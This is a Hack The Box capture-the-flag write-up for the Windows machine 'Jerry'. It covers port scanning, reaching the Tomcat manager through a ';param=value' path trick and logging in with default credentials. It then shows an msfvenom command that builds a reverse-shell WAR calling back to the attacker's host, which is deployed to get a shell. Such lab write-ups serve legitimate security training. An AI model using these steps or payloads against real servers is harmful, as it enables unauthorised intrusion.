---
tags:
  - tomcat
---
# HTB: Jerry

***Overview**: Jerry is an Easy rated Windows machine on Hackthebox that exploits the upload of java applications (.war files) to gain foothold.*

## Scanning and Enumeration

- So we start by scanning for open ports as well as the services running on those ports

```shell
┌──(kali㉿kali)-[~/HTB/Jerry]
└─$ sudo masscan -p1-65535 10.10.10.95 --rate=1000 -e tun0 > ports
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-11-11 21:02:20 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Jerry]
└─$ cat ports
Discovered open port 8080/tcp on 10.10.10.95    
```

```shell
                                                                                                                                                                       
┌──(kali㉿kali)-[~/HTB/Jerry]
└─$ nmap -sV -sC -p8080 10.10.10.40 -v -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 16:05 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:05
Completed NSE at 16:05, 0.00s elapsed
Initiating NSE at 16:05
Completed NSE at 16:05, 0.00s elapsed
Initiating NSE at 16:05
Completed NSE at 16:05, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:05
Completed Parallel DNS resolution of 1 host. at 16:05, 0.00s elapsed
Initiating Connect Scan at 16:05
Scanning 10.10.10.40 [1 port]
Completed Connect Scan at 16:05, 2.01s elapsed (1 total ports)
Initiating Service scan at 16:05
NSE: Script scanning 10.10.10.40.
Initiating NSE at 16:05
Completed NSE at 16:06, 5.01s elapsed
Initiating NSE at 16:06
Completed NSE at 16:06, 0.01s elapsed
Initiating NSE at 16:06
Completed NSE at 16:06, 0.00s elapsed
Nmap scan report for 10.10.10.40
Host is up.

PORT     STATE    SERVICE    VERSION
8080/tcp filtered http-proxy

NSE: Script Post-scanning.
Initiating NSE at 16:06
Completed NSE at 16:06, 0.00s elapsed
Initiating NSE at 16:06
Completed NSE at 16:06, 0.00s elapsed
Initiating NSE at 16:06
Completed NSE at 16:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.53 seconds
                                                                        
```

- so navigating to the webserver, we can see that Apache Tomcat/7.0.88 is running

![](assets/Jerry_assets/Pasted%20image%2020231111220611.png)

```ad-info
Apache Tomcat is an open source web server and servlet container used for deploying Java based web applications
- it functions as a Web server and a Servlet container
- Web server by handling HTTP request and also serving static contents like images, they also send dynamic content to Java servlets
- Servlets handle dynamic content generation and interaction with web applications
- The Tomcat manager is a web application in the tomcat server that allows us to manager our deployed web applications as well as the tomcat server itself.
	- we can deploy web applications; WAR files or unpacked directories containing web application files
- WAR files: Web Application Archive Files; a packaged bundle of files that contain a complete Java web application. a folder containing Servlets, JavaServer Pages(JSP), HTML, CSS and JS files, Libraries and dependencies, configuration files
- JSP(or Jakarta Server Pages): a server side technology that enables the creation of dynamic web pages using Java
```

- so we navigate to the manager directory by using the `;param=value` trick as seen below

![](assets/Jerry_assets/Pasted%20image%2020231111221036.png)

- if we use the wrong login we are brought to the error page that actually displays default credentials, 

![](assets/Jerry_assets/Pasted%20image%2020231111221117.png)

- so we use this default credentials tomcat and s3cret at http://10.10.10.95:8080/;param=value/manager/html and we have access
- so now we are brought to the tomcat manager dashboard

![](assets/Jerry_assets/Pasted%20image%2020231111221449.png)

## Exploitation

- we generate a reverse shell war file using msfvenom

```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f war -o revshell.war
```

- then we browse to the file and deploy it to execute it

![](assets/Jerry_assets/Pasted%20image%2020231111221724.png)

![](assets/Jerry_assets/Pasted%20image%2020231112054146.png)

- in our netcat listener, we get a shell

![](assets/Jerry_assets/Pasted%20image%2020231112054306.png)

- then we can view the user and root txt files

![](assets/Jerry_assets/Pasted%20image%2020231112055008.png)